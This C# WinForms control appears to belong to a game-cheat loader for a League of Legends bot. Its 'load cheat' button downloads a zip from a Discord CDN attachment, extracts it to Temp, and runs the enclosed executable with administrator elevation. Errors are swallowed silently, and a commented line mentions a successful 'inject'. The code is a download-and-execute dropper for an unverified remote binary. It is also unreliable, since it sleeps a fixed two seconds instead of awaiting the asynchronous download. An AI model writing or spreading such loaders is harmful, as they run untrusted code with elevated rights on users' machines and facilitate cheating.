using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using Microsoft.Win32;
using Microsoft.Win32.SafeHandles;
using System.Windows.Data;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Windows.Forms;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO.Compression;

namespace Loader.Products
{
    public partial class lolbot1 : UserControl
    {
        public lolbot1()
        {
            InitializeComponent();
        }

        private void loadcheatbutton_Click(object sender, EventArgs e)
        {

            try
            {
                string download = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Temp\\LoLBot.zip");
                string extractzip = (Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Local\\Temp\\1");

                WebClient webClient = new WebClient();
                webClient.DownloadFileAsync(new Uri("https://cdn.discordapp.com/attachments/980267575902609431/980558942042210394/LoLBot.zip"), @download);

                Thread.Sleep(2000);
                string zipPatch = download;
                string extractPatch = extractzip;
                System.IO.Compression.ZipFile.ExtractToDirectory(zipPatch, extractPatch);

                // Construct the path.
                string temp = Environment.GetEnvironmentVariable("temp");
                string path = Path.Combine(temp, "1\\LeagueBotNet.exe");
                // Launch the process.
                Process p = new Process();
                p.StartInfo.FileName = path;
                p.StartInfo.Arguments = "/passive";
                p.StartInfo.Verb = "runas";
                p.Start();
                Console.Beep(500, 750);
                Console.Beep(500, 500);
                Console.Beep(500, 400);

            }
            catch (Exception)
            {
                // MessageBox.Show("inject sucessfull.", "", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }

        }
    }
}
